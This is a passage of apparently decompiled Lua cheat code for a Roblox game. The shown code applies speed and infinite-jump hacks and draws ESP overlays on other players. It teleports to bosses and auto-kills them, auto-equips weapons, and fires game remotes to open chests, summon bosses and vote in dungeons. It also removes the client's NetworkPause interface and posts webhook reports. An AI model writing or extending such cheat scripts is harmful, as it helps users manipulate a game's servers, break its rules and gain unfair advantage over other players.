        items = runtime.create(4)
        value = capturedClonerefResult
        value2 = capturedClonerefResult
        enemies = value2.FindFirstChild(value2, "Enemies")
        value3 = capturedClonerefResult
        mobs = value3.FindFirstChild(value3, "Mobs")
        value4 = capturedClonerefResult
        nPCs = value4.FindFirstChild(value4, "NPCs")
        value5 = capturedClonerefResult
        callResults = runtime.pack(value5.FindFirstChild(value5, "Npcs"))
        items2 = items
        runtime.move({ value, enemies, mobs, nPCs }, 1, 4, 1, items2)
        runtime.move(callResults, 1, (((callResults.n + 9) - 1) - 8), 5, items2)
        callResults2 = runtime.pack(environment.pairs(items))
        callResults3 = callResults2
        savedIterations2 = { nil, [5] = nil, nil, nil }
        result = runtime.wrapIterator(runtime.iteratorBody1)
        result(callResults3[1], callResults3[2], callResults3[3])
        iteratorValue = nil
        iterationCursor2 = result
        while true do
            hasNext, iteratorKey, iteratorValue2 = iterationCursor2()
            if not hasNext then
            else
                iteratorValue = iteratorValue2
            end
            if hasNext then
                if not iteratorValue then
                    if not findFirstChildResult then
                        continue
                    end
                else
                    iteratorValue3 = iteratorValue
                    findFirstChildResult4 = iteratorValue3.FindFirstChild(iteratorValue3, textValue)
                    if not findFirstChildResult4 then
                        if not findFirstChildResult then
                            continue
                        end
                    else
                        findFirstChildResult3 = findFirstChildResult4
                        if
                            not (findFirstChildResult3.FindFirstChild(findFirstChildResult3, "Humanoid"))
                            or not (0 < findFirstChildResult4.Humanoid.Health)
                        then
                            if not findFirstChildResult then
                                continue
                            end
                        else
                            findFirstChildResult2 = findFirstChildResult4
                            if
                                not (
                                    findFirstChildResult2.FindFirstChild(
                                        findFirstChildResult2,
                                        "HumanoidRootPart"
                                    )
                                )
                            then
                                if not findFirstChildResult then
                                    continue
                                end
                            else
                                find = environment.string.find
                                name = findFirstChildResult4.Name
                                if not (find((name.lower(name)), "dummy")) then
                                    findFirstChildResult = findFirstChildResult4
                                else
                                    if not findFirstChildResult then
                                        continue
                                    end
                                end
                            end
                        end
                    end
                end
            end
            break
        end
        iterationCursor = savedIterations2[3]
        iterationLimit = savedIterations2[2]
        iterationStep = savedIterations2[5]
        savedIterations = savedIterations2[1]
        if findFirstChildResult then
            capturedCallback8((capturedCallback13(findFirstChildResult.HumanoidRootPart)))
            if not ((not environment._G.AutoEquipEnabled) or not environment._G.SelectedWeaponGroup) then
                capturedCallback15(environment._G.SelectedWeaponGroup)
            end
            capturedCallback14()
        end
        return
    end, closureEnvironment)
end

function functions.callbackAtLine65(
    closureEnvironment,
    capturedValuesState2,
    capturedTextValueState6,
    capturedResult13
)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        environment.task.spawn(
            functions.handleTypeValue(
                environment,
                capturedValuesState2,
                capturedTextValueState6,
                capturedResult13
            )
        )
        return
    end, closureEnvironment)
end

function functions.handleTypeValue(
    closureEnvironment,
    capturedValuesState2,
    capturedTextValueState6,
    capturedResult13
)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        local callResults, callResults2, hasNext, iterationCursor, iterationCursor2, iterationLimit, iterationStep, iteratorKey, iteratorKey2, iteratorValue, iteratorValue2, matches
        local matches2, result, savedIterations, savedIterations2
        if (environment["type"](capturedValuesState2.value)) == "table" then
            callResults = runtime.pack(environment.pairs(capturedValuesState2.value))
            callResults2 = callResults
            savedIterations2 = { nil, [5] = nil, nil, nil }
            result = runtime.wrapIterator(runtime.iteratorBody1)
            result(callResults2[1], callResults2[2], callResults2[3])
            iteratorKey2 = nil
            iteratorValue2 = nil
            iterationCursor2 = result
            while true do
                hasNext, iteratorKey, iteratorValue = iterationCursor2()
                if not hasNext then
                else
                    iteratorKey2 = iteratorKey
                    iteratorValue2 = iteratorValue
                end
                if hasNext then
                    matches = ((environment["type"](iteratorKey2)) == "number")
                    if not matches then
                        matches = (iteratorValue2 == true)
                    end
                    matches2 = ((environment["type"](iteratorKey2)) == "number")
                    if matches2 then
                        matches2 = iteratorValue2
                    end
                    if not matches2 then
                        matches2 = iteratorKey2
                    end
                    if matches then
                        environment.pcall(
                            functions.handleWaitForChildAtLine5(
                                environment,
                                matches2,
                                capturedTextValueState6,
                                capturedResult13
                            )
                        )
                        environment.task.wait(0.3)
                    end
                    continue
                end
                break
            end
            iterationCursor = savedIterations2[3]
            iterationLimit = savedIterations2[2]
            iterationStep = savedIterations2[5]
            savedIterations = savedIterations2[1]
        else
            environment.pcall(
                functions.handleWaitForChildAtLine117(
                    environment,
                    capturedValuesState2,
                    capturedTextValueState6,
                    capturedResult13
                )
            )
        end
        return
    end, closureEnvironment)
end

function functions.handleWaitForChildAtLine5(
    closureEnvironment,
    capturedMatches2,
    capturedTextValueState6,
    capturedResult13
)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        local content, gameValue, items, notify, value, value2, value3, value4
        gameValue = environment.game
        value = (gameValue.GetService(gameValue, "ReplicatedStorage"))
        value2 = (value.WaitForChild(value, "Remotes"))
        value3 = (value2.WaitForChild(value2, "UseItem"))
        value3.FireServer(value3, "Use", capturedMatches2, capturedTextValueState6.value)
        value4 = capturedResult13
        notify = value4.Notify
        items = {}
        items.Title = "Chest"
        content = ("Opening " .. (capturedTextValueState6.value .. ("x " .. capturedMatches2)))
        items.Content = content
        items.Duration = 2
        notify(value4, items)
        return
    end, closureEnvironment)
end

function functions.handleWaitForChildAtLine117(
    closureEnvironment,
    capturedValuesState2,
    capturedTextValueState6,
    capturedResult13
)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        local content, gameValue, items, notify, value, value2, value3, value4
        gameValue = environment.game
        value = (gameValue.GetService(gameValue, "ReplicatedStorage"))
        value2 = (value.WaitForChild(value, "Remotes"))
        value3 = (value2.WaitForChild(value2, "UseItem"))
        value3.FireServer(value3, "Use", capturedValuesState2.value, capturedTextValueState6.value)
        value4 = capturedResult13
        notify = value4.Notify
        items = {}
        items.Title = "Chest"
        content = ("Opening " .. (capturedTextValueState6.value .. ("x " .. capturedValuesState2.value)))
        items.Content = content
        items.Duration = 2
        notify(value4, items)
        return
    end, closureEnvironment)
end

function functions.handleFindFirstChildAtLine25(closureEnvironment, capturedLocalPlayer2)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        local character, humanoid
        if not ((not environment._G.SpeedEnabled) or not capturedLocalPlayer2.Character) then
            character = capturedLocalPlayer2.Character
            if character.FindFirstChild(character, "Humanoid") then
                humanoid = capturedLocalPlayer2.Character.Humanoid
                humanoid.WalkSpeed = 160
            end
        end
        return
    end, closureEnvironment)
end

function functions.handleFindFirstChildAtLine67(closureEnvironment, capturedLocalPlayer2)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        local character, humanoid
        if not ((not environment._G.InfJumpEnabled) or not capturedLocalPlayer2.Character) then
            character = capturedLocalPlayer2.Character
            if character.FindFirstChild(character, "Humanoid") then
                humanoid = capturedLocalPlayer2.Character.Humanoid
                humanoid.ChangeState(humanoid, "Jumping")
            end
        end
        return
    end, closureEnvironment)
end

function functions.handleConnect(closureEnvironment, capturedLocalPlayer2)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        local argument1 = ...
        local argument12, callback, characterAdded
        argument12 = argument1
        if argument12 == capturedLocalPlayer2 then
            return
        else
            callback = functions.handleNewAtLine75(environment, argument12, capturedLocalPlayer2)
            characterAdded = argument12.CharacterAdded
            characterAdded.Connect(characterAdded, functions.handleWaitForChildAtLine1(environment, callback))
            if argument12.Character then
                callback()
            end
            return
        end
    end, closureEnvironment)
end

function functions.handleNewAtLine75(closureEnvironment, capturedArgument12, capturedLocalPlayer2)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        local adornee, character, character2, character3, font, humanoid, instanceObject, instanceObject2, outlineColor, parent, parent2, parent3
        local size, size2, studsOffset, textColor3
        if not capturedArgument12.Character then
            return
        else
            character2 = capturedArgument12.Character
            adornee = character2.FindFirstChild(character2, "HumanoidRootPart")
            character3 = capturedArgument12.Character
            humanoid = character3.FindFirstChild(character3, "Humanoid")
            if not ((not adornee) or ((not humanoid) or not (0 < humanoid.Health))) then
                character = capturedArgument12.Character
                if not (character.FindFirstChild(character, "LumeESP_Box")) then
                    instanceObject2 = environment.Instance.new("Highlight")
                    instanceObject2.Name = "LumeESP_Box"
                    instanceObject2.FillTransparency = 1
                    outlineColor = environment.Color3.fromRGB(255, 0, 0)
                    instanceObject2.OutlineColor = outlineColor
                    instanceObject2.OutlineTransparency = 0
                    parent = capturedArgument12.Character
                    instanceObject2.Parent = parent
                    parent2 = environment.Instance.new("BillboardGui")
                    parent2.Name = "LumeESP_Text"
                    parent2.Adornee = adornee
                    size = environment.UDim2.new(0, 200, 0, 50)
                    parent2.Size = size
                    studsOffset = environment.Vector3.new(0, 3.5, 0)
                    parent2.StudsOffset = studsOffset
                    parent2.AlwaysOnTop = true
                    instanceObject = environment.Instance.new("TextLabel")
                    instanceObject.Parent = parent2
                    instanceObject.BackgroundTransparency = 1
                    size2 = environment.UDim2.new(1, 0, 1, 0)
                    instanceObject.Size = size2
                    instanceObject.TextStrokeTransparency = 0
                    textColor3 = environment.Color3.fromRGB(255, 255, 255)
                    instanceObject.TextColor3 = textColor3
                    font = environment.Enum.Font.SourceSansBold
                    instanceObject.Font = font
                    instanceObject.TextSize = 14
                    parent3 = capturedArgument12.Character
                    parent2.Parent = parent3
                    environment.task.spawn(
                        functions.handleFormat(
                            environment,
                            capturedArgument12,
                            capturedLocalPlayer2,
                            adornee,
                            instanceObject
                        )
                    )
                end
            end
            return
        end
    end, closureEnvironment)
end

function functions.handleFormat(
    closureEnvironment,
    capturedArgument12,
    capturedLocalPlayer2,
    capturedAdornee,
    capturedInstanceObject
)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        local character, magnitude, text
        while true do
            if capturedArgument12.Character then
                character = capturedArgument12.Character
                if
                    not (
                        not (character.FindFirstChild(character, "LumeESP_Text"))
                        or not environment._G.ESPEnabled
                    )
                then
                    magnitude = (
                        (capturedLocalPlayer2.Character.HumanoidRootPart.Position - capturedAdornee.Position)
                    ).Magnitude
                    text = environment.string.format("%s\n[ %.0f M ]", capturedArgument12.Name, magnitude)
                    capturedInstanceObject.Text = text
                    environment.task.wait(0.1)
                    continue
                end
            end
            break
        end
        return
    end, closureEnvironment)
end

function functions.handleWaitForChildAtLine1(closureEnvironment, capturedCallback)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        local argument1 = ...
        local argument12, argument13
        argument13 = argument1
        if environment._G.ESPEnabled then
            argument12 = argument13
            argument12.WaitForChild(argument12, "HumanoidRootPart")
            environment.task.wait(0.5)
            capturedCallback()
        end
        return
    end, closureEnvironment)
end

function functions.handleFindFirstChildAtLine99(closureEnvironment)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        local callResults, callResults2, callResults3, character, character2, hasNext, iterationCursor, iterationCursor2, iterationLimit, iterationStep, iteratorKey, iteratorValue
        local iteratorValue2, lumeESP_Box, lumeESP_Text, pairsValue, players, result, savedIterations, savedIterations2
        pairsValue = environment.pairs
        players = environment.game.Players
        callResults = runtime.pack(players.GetPlayers(players))
        callResults2 =
            runtime.pack(pairsValue(runtime.unpack(callResults, 1, (((callResults.n + 2) - 1) - 1))))
        callResults3 = callResults2
        savedIterations2 = { nil, [5] = nil, nil, nil }
        result = runtime.wrapIterator(runtime.iteratorBody1)
        result(callResults3[1], callResults3[2], callResults3[3])
        iteratorValue2 = nil
        iterationCursor2 = result
        while true do
            hasNext, iteratorKey, iteratorValue = iterationCursor2()
            if not hasNext then
            else
                iteratorValue2 = iteratorValue
            end
            if hasNext then
                if iteratorValue2.Character then
                    character2 = iteratorValue2.Character
                    if character2.FindFirstChild(character2, "LumeESP_Box") then
                        lumeESP_Box = iteratorValue2.Character.LumeESP_Box
                        lumeESP_Box.Destroy(lumeESP_Box)
                    end
                    character = iteratorValue2.Character
                    if character.FindFirstChild(character, "LumeESP_Text") then
                        lumeESP_Text = iteratorValue2.Character.LumeESP_Text
                        lumeESP_Text.Destroy(lumeESP_Text)
                    end
                end
                continue
            end
            break
        end
        iterationCursor = savedIterations2[3]
        iterationLimit = savedIterations2[2]
        iterationStep = savedIterations2[5]
        savedIterations = savedIterations2[1]
        return
    end, closureEnvironment)
end

function functions.handleFindFirstChild2(closureEnvironment, capturedLocalPlayer2, capturedItems40)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        local argument1 = ...
        local argument12, backpack, callResults, callResults2, callResults3, callResults4, character, character2, findFirstChildResult, hasNext, hasNext2, humanoid
        local humanoid2, items, iterationCursor, iterationCursor2, iterationCursor3, iterationCursor4, iterationLimit, iterationLimit2, iterationStep, iterationStep2, iteratorKey, iteratorKey2
        local iteratorValue, iteratorValue2, iteratorValue3, iteratorValue4, result, result2, savedIterations, savedIterations2, savedIterations3, savedIterations4, value
        argument12 = argument1
        if not environment._G.AutoEquipEnabled then
            return
        else
            if not capturedLocalPlayer2.Character then
                return
            else
                character = capturedLocalPlayer2.Character
                humanoid2 = character.FindFirstChild(character, "Humanoid")
                if not humanoid2 then
                    return
                else
                    items = capturedItems40[argument12]
                    if not items then
                        items = runtime.create(1)
                        runtime.move({ argument12 }, 1, 1, 1, items)
                    end
                    callResults = runtime.pack(environment.ipairs(items))
                    callResults2 = callResults
                    savedIterations = { nil, [5] = nil, nil, nil }
                    result = runtime.wrapIterator(runtime.iteratorBody1)
                    result(callResults2[1], callResults2[2], callResults2[3])
                    iteratorValue = nil
                    iterationCursor = result
                    while true do
                        hasNext, iteratorKey, iteratorValue2 = iterationCursor()
                        if not hasNext then
                        else
                            iteratorValue = iteratorValue2
                        end
                        if hasNext then
                            character2 = capturedLocalPlayer2.Character
                            if not (character2.FindFirstChild(character2, iteratorValue)) then
                                continue
                            else
                                return
                            end
                        end
                        break
                    end
                    iterationCursor2 = savedIterations[3]
                    iterationLimit = savedIterations[2]
                    iterationStep = savedIterations[5]
                    savedIterations2 = savedIterations[1]
                    value = capturedLocalPlayer2
                    if not (value.FindFirstChild(value, "Backpack")) then
                        return
                    else
                        callResults3 = runtime.pack(environment.ipairs(items))
                        callResults4 = callResults3
                        savedIterations4 =
                            { savedIterations2, [5] = iterationStep, iterationLimit, iterationCursor2 }
                        result2 = runtime.wrapIterator(runtime.iteratorBody1)
                        result2(callResults4[1], callResults4[2], callResults4[3])
                        iteratorValue3 = nil
                        iterationCursor4 = result2
                        while true do
                            hasNext2, iteratorKey2, iteratorValue4 = iterationCursor4()
                            if not hasNext2 then
                            else
                                iteratorValue3 = iteratorValue4
                            end
                            if hasNext2 then
                                backpack = capturedLocalPlayer2.Backpack
                                findFirstChildResult = backpack.FindFirstChild(backpack, iteratorValue3)
                                if not findFirstChildResult then
                                    continue
                                else
                                    humanoid = humanoid2
                                    humanoid.EquipTool(humanoid, findFirstChildResult)
                                    return
                                end
                            end
                            break
                        end
                        iterationCursor3 = savedIterations4[3]
                        iterationLimit2 = savedIterations4[2]
                        iterationStep2 = savedIterations4[5]
                        savedIterations3 = savedIterations4[1]
                        return
                    end
                end
            end
        end
    end, closureEnvironment)
end

function functions.handleTypeValueAtLine91(
    closureEnvironment,
    capturedOptions,
    capturedValuesState2,
    capturedCallback,
    capturedTextValueState6
)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        local callResults, callResults2, hasNext, iterationCursor, iterationCursor2, iterationLimit, iterationStep, iteratorKey, iteratorKey2, iteratorValue, iteratorValue2, matches
        local matches2, result, savedIterations, savedIterations2
        while true do
            environment.task.wait(1)
            if not ((not capturedOptions.AutoOpenSelected) or not capturedOptions.AutoOpenSelected.Value) then
                if (environment["type"](capturedValuesState2.value)) == "table" then
                    callResults = runtime.pack(environment.pairs(capturedValuesState2.value))
                    callResults2 = callResults
                    savedIterations =
                        { savedIterations2, [5] = iterationStep, iterationLimit, iterationCursor2 }
                    result = runtime.wrapIterator(runtime.iteratorBody1)
                    result(callResults2[1], callResults2[2], callResults2[3])
                    iteratorKey = nil
                    iteratorValue = nil
                    iterationCursor = result
                    while true do
                        hasNext, iteratorKey2, iteratorValue2 = iterationCursor()
                        if not hasNext then
                        else
                            iteratorKey = iteratorKey2
                            iteratorValue = iteratorValue2
                        end
                        if not ((not hasNext) or not capturedOptions.AutoOpenSelected.Value) then
                            matches2 = ((environment["type"](iteratorKey)) == "number")
                            if not matches2 then
                                matches2 = (iteratorValue == true)
                            end
                            matches = ((environment["type"](iteratorKey)) == "number")
                            if matches then
                                matches = iteratorValue
                            end
                            if not matches then
                                matches = iteratorKey
                            end
                            if not ((not matches2) or not (capturedCallback(matches))) then
                                environment.pcall(
                                    functions.handleWaitForChildAtLine99(
                                        environment,
                                        matches,
                                        capturedTextValueState6
                                    )
                                )
                                environment.task.wait(0.5)
                            end
                            continue
                        end
                        break
                    end
                    iterationCursor2 = savedIterations[3]
                    iterationLimit = savedIterations[2]
                    iterationStep = savedIterations[5]
                    savedIterations2 = savedIterations[1]
                else
                    if capturedCallback(capturedValuesState2.value) then
                        environment.pcall(
                            functions.handleWaitForChildAtLine25(
                                environment,
                                capturedValuesState2,
                                capturedTextValueState6
                            )
                        )
                    end
                end
            end
            continue
        end
    end, closureEnvironment)
end

function functions.handleWaitForChildAtLine25(
    closureEnvironment,
    capturedValuesState2,
    capturedTextValueState6
)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        local gameValue, value, value2, value3
        gameValue = environment.game
        value = (gameValue.GetService(gameValue, "ReplicatedStorage"))
        value2 = (value.WaitForChild(value, "Remotes"))
        value3 = (value2.WaitForChild(value2, "UseItem"))
        value3.FireServer(value3, "Use", capturedValuesState2.value, capturedTextValueState6.value)
        return
    end, closureEnvironment)
end

function functions.handleWaitForChildAtLine99(closureEnvironment, capturedMatches, capturedTextValueState6)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        local gameValue, value, value2, value3
        gameValue = environment.game
        value = (gameValue.GetService(gameValue, "ReplicatedStorage"))
        value2 = (value.WaitForChild(value, "Remotes"))
        value3 = (value2.WaitForChild(value2, "UseItem"))
        value3.FireServer(value3, "Use", capturedMatches, capturedTextValueState6.value)
        return
    end, closureEnvironment)
end

function functions.handleSpawn2(
    closureEnvironment,
    capturedCallback9,
    capturedLocalPlayer2,
    capturedCallback8,
    capturedCallback13,
    capturedCallback15,
    capturedCallback14
)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        local argument1 = ...
        local autoKillSummon, gValue, gValue2
        autoKillSummon = argument1
        gValue2 = environment._G
        gValue2.AutoKillSummon = autoKillSummon
        if autoKillSummon then
            gValue = environment._G
            gValue.HasWarpedToSummon = false
            environment.task.spawn(functions.handleNewAtLine119(environment, capturedCallback9))
            environment.task.spawn(
                functions.handleWaitAtLine19(
                    environment,
                    capturedLocalPlayer2,
                    capturedCallback8,
                    capturedCallback13,
                    capturedCallback15,
                    capturedCallback14
                )
            )
        end
        return
    end, closureEnvironment)
end

function functions.handleNewAtLine119(closureEnvironment, capturedCallback9)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        local callResults, value
        value = capturedCallback9
        callResults = runtime.pack(environment.Vector3.new(651.810181, -3.67419362, -1021.13123))
        value(runtime.unpack(callResults, 1, (((callResults.n + 2) - 1) - 1)))
        return
    end, closureEnvironment)
end

function functions.handleWaitAtLine19(
    closureEnvironment,
    capturedLocalPlayer2,
    capturedCallback8,
    capturedCallback13,
    capturedCallback15,
    capturedCallback14
)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        while true do
            if environment._G.AutoKillSummon then
                environment.task.wait(0.1)
                if not environment._G.IsPortaling then
                    environment.pcall(
                        functions.handleFindFirstChildAtLine92(
                            environment,
                            capturedLocalPlayer2,
                            capturedCallback8,
                            capturedCallback13,
                            capturedCallback15,
                            capturedCallback14
                        )
                    )
                end
                continue
            end
            break
        end
        return
    end, closureEnvironment)
end

function functions.handleFindFirstChildAtLine92(
    closureEnvironment,
    capturedLocalPlayer2,
    capturedCallback8,
    capturedCallback13,
    capturedCallback15,
    capturedCallback14
)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        local callResults, character, find, findFirstChildResult, findFirstChildResult2, findFirstChildResult3, gValue, nPCs, name, value
        if (not environment._G.HasWarpedToSummon) and capturedLocalPlayer2.Character then
            character = capturedLocalPlayer2.Character
            if character.FindFirstChild(character, "HumanoidRootPart") then
                value = capturedCallback8
                callResults = runtime.pack(
                    environment.CFrame.new(
                        651.810181,
                        -3.67419362,
                        -1021.13123,
                        -0.694649816,
                        0,
                        -0.719348073,
                        0,
                        1,
                        0,
                        0.719348073,
                        0,
                        -0.694649816
                    )
                )
                value(runtime.unpack(callResults, 1, (((callResults.n + 2) - 1) - 1)))
                gValue = environment._G
                gValue.HasWarpedToSummon = true
                environment.task.wait(1)
            end
        end
        if not ((not environment._G.SelectedSummonBoss) or (environment._G.SelectedSummonBoss == "None")) then
            nPCs = environment.workspace.NPCs
            findFirstChildResult = nPCs.FindFirstChild(nPCs, environment._G.SelectedSummonBoss)
            if findFirstChildResult then
                findFirstChildResult2 = findFirstChildResult
                if
                    not (
                        not (findFirstChildResult2.FindFirstChild(findFirstChildResult2, "Humanoid"))
                        or not (0 < findFirstChildResult.Humanoid.Health)
                    )
                then
                    findFirstChildResult3 = findFirstChildResult
                    if findFirstChildResult3.FindFirstChild(findFirstChildResult3, "HumanoidRootPart") then
                        find = environment.string.find
                        name = findFirstChildResult.Name
                        if not (find((name.lower(name)), "dummy")) then
                            capturedCallback8((capturedCallback13(findFirstChildResult.HumanoidRootPart)))
                            if
                                not (
                                    not environment._G.AutoEquipEnabled
                                    or not environment._G.SelectedWeaponGroup
                                )
                            then
                                capturedCallback15(environment._G.SelectedWeaponGroup)
                            end
                            capturedCallback14()
                        end
                    end
                end
            end
        end
        return
    end, closureEnvironment)
end

function functions.handleWaitAtLine29(closureEnvironment, capturedOptions)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        while true do
            environment.task.wait(3)
            if
                not (
                    not capturedOptions.AutoSummonGilgamesh or not capturedOptions.AutoSummonGilgamesh.Value
                )
            then
                environment.pcall(functions.handleWaitForChildAtLine98(environment))
            end
            continue
        end
    end, closureEnvironment)
end

function functions.handleWaitForChildAtLine98(closureEnvironment)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        local callResults, fireServer, gameValue, items, value, value2, value3
        items = runtime.create(2)
        runtime.move({ "GilgameshBoss", environment._G.SelectedGilgameshDifficulty }, 1, 2, 1, items)
        gameValue = environment.game
        value = (gameValue.GetService(gameValue, "ReplicatedStorage"))
        value2 = (value.WaitForChild(value, "Remotes"))
        value3 = (value2.WaitForChild(value2, "RequestSummonBoss"))
        fireServer = value3.FireServer
        callResults = runtime.pack(environment.unpack(items))
        fireServer(value3, runtime.unpack(callResults, 1, (((callResults.n + 4) - 1) - 3)))
        return
    end, closureEnvironment)
end

function functions.handleWaitForChildAtLine29(
    closureEnvironment,
    capturedReplicatedStorage,
    capturedItems17,
    capturedPlayers,
    capturedItems18
)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        local onClientEvent, onClientEvent2, value, waitForChildResult, waitForChildResult2, waitForChildResult3, waitForChildResult4, waitForChildResult5
        value = capturedReplicatedStorage
        waitForChildResult = value.WaitForChild(value, "RemoteEvents", 10)
        if waitForChildResult then
            waitForChildResult4 = waitForChildResult
            waitForChildResult5 = waitForChildResult4.WaitForChild(waitForChildResult4, "HakiStateUpdate", 5)
            if waitForChildResult5 then
                onClientEvent2 = waitForChildResult5.OnClientEvent
                onClientEvent2.Connect(
                    onClientEvent2,
                    functions.handleCallback7(environment, capturedItems17)
                )
            end
            waitForChildResult2 = waitForChildResult
            waitForChildResult3 =
                waitForChildResult2.WaitForChild(waitForChildResult2, "ObservationHakiStateUpdate", 5)
            if waitForChildResult3 then
                onClientEvent = waitForChildResult3.OnClientEvent
                onClientEvent.Connect(
                    onClientEvent,
                    functions.handleCallback8(environment, capturedPlayers, capturedItems18)
                )
            end
        end
        return
    end, closureEnvironment)
end

function functions.handleCallback7(closureEnvironment, capturedItems17)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        local active = ...
        capturedItems17.Active = active
        return
    end, closureEnvironment)
end

function functions.handleCallback8(closureEnvironment, capturedPlayers, capturedItems18)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        local argument1, argument2 = ...
        local active
        active = argument2
        if argument1 == capturedPlayers.LocalPlayer then
            capturedItems18.Active = active
        end
        return
    end, closureEnvironment)
end

function functions.handleCallback9(closureEnvironment)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        local selectedBosses = ...
        local gValue
        gValue = environment._G
        gValue.SelectedBosses = selectedBosses
        return
    end, closureEnvironment)
end

function functions.handleGetServiceAtLine87(closureEnvironment)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        local coreScriptsNetworkPause, gameValue
        gameValue = environment.game
        coreScriptsNetworkPause = (gameValue.GetService(gameValue, "CoreGui")).RobloxGui["CoreScripts/NetworkPause"]
        coreScriptsNetworkPause.Destroy(coreScriptsNetworkPause)
        return
    end, closureEnvironment)
end

function functions.callbackAtLine40(closureEnvironment, capturedOptions)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        while true do
            environment.task.wait(2)
            if not ((not capturedOptions.AutoRetryDungeon) or not capturedOptions.AutoRetryDungeon.Value) then
                environment.pcall(functions.handleWaitForChildAtLine74(environment))
            end
            continue
        end
    end, closureEnvironment)
end

function functions.handleWaitForChildAtLine74(closureEnvironment)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        local gameValue, value, value2, value3
        gameValue = environment.game
        value = (gameValue.GetService(gameValue, "ReplicatedStorage"))
        value2 = (value.WaitForChild(value, "Remotes"))
        value3 = (value2.WaitForChild(value2, "DungeonWaveReplayVote"))
        value3.FireServer(value3, "sponsor")
        return
    end, closureEnvironment)
end

function functions.callbackAtLine123(closureEnvironment, capturedOptions, capturedBossState2)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        while true do
            environment.task.wait(1)
            if
                not ((not capturedOptions.AutoVoteDifficulty) or not capturedOptions.AutoVoteDifficulty.Value)
            then
                environment.pcall(functions.handleWaitForChildAtLine51(environment, capturedBossState2))
            end
            continue
        end
    end, closureEnvironment)
end

function functions.handleWaitForChildAtLine51(closureEnvironment, capturedBossState2)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        local gameValue, value, value2, value3
        gameValue = environment.game
        value = (gameValue.GetService(gameValue, "ReplicatedStorage"))
        value2 = (value.WaitForChild(value, "Remotes"))
        value3 = (value2.WaitForChild(value2, "DungeonWaveVote"))
        value3.FireServer(value3, capturedBossState2.value)
        return
    end, closureEnvironment)
end

function functions.handleCallback10(closureEnvironment)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        local selectedDifficultyV2 = ...
        local gValue
        gValue = environment._G
        gValue.SelectedDifficultyV2 = selectedDifficultyV2
        return
    end, closureEnvironment)
end

function functions.handleTick(closureEnvironment, capturedOptions, capturedCallback3)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        local numberValue
        numberValue = 0
        while true do
            environment.task.wait(1)
            if
                not (
                    ((not capturedOptions.EnableAutoReport) or not capturedOptions.EnableAutoReport.Value)
                    or (
                        (environment._G.WebhookURL == "")
                        or not (600 <= ((environment.tick()) - numberValue))
                    )
                )
            then
                capturedCallback3()
                numberValue = (environment.tick())
            end
            continue
        end
    end, closureEnvironment)
end

function functions.handleWaitAtLine115(
    closureEnvironment,
    capturedOptions,
    capturedClonerefResult,
    capturedCallback13,
    capturedCallback8,
    capturedCallback15,
    capturedCallback14
)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        while true do
            environment.task.wait(0.1)
            if
                not (
                    ((not capturedOptions.AutoKillRimuru) or not capturedOptions.AutoKillRimuru.Value)
                    or environment._G.IsPortaling
                )
            then
                environment.pcall(
                    functions.handleFindFirstChildAtLine22(
                        environment,
                        capturedClonerefResult,
                        capturedCallback13,
                        capturedCallback8,
                        capturedCallback15,
                        capturedCallback14
                    )
                )
            end
            continue
        end
    end, closureEnvironment)
end

function functions.handleFindFirstChildAtLine22(
    closureEnvironment,
    capturedClonerefResult,
    capturedCallback13,
    capturedCallback8,
    capturedCallback15,
    capturedCallback14
)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        local callResults, callResults2, callResults3, enemies, find, findFirstChildResult, findFirstChildResult2, findFirstChildResult3, findFirstChildResult4, hasNext, items, items2
        local iterationCursor, iterationCursor2, iterationLimit, iterationStep, iteratorKey, iteratorValue, iteratorValue2, iteratorValue3, mobs, nPCs, name, result
        local savedIterations, savedIterations2, textValue, value, value2, value3, value4, value5
        textValue = ("RimuruBoss_" .. environment._G.SelectedRimuruDifficulty)
        findFirstChildResult2 = nil
        items = runtime.create(4)
        value = capturedClonerefResult
        value2 = capturedClonerefResult
        enemies = value2.FindFirstChild(value2, "Enemies")
        value3 = capturedClonerefResult
        mobs = value3.FindFirstChild(value3, "Mobs")
        value4 = capturedClonerefResult
        nPCs = value4.FindFirstChild(value4, "NPCs")
        value5 = capturedClonerefResult
        callResults = runtime.pack(value5.FindFirstChild(value5, "Npcs"))
        items2 = items
        runtime.move({ value, enemies, mobs, nPCs }, 1, 4, 1, items2)
        runtime.move(callResults, 1, (((callResults.n + 8) - 1) - 7), 5, items2)
        callResults2 = runtime.pack(environment.pairs(items))
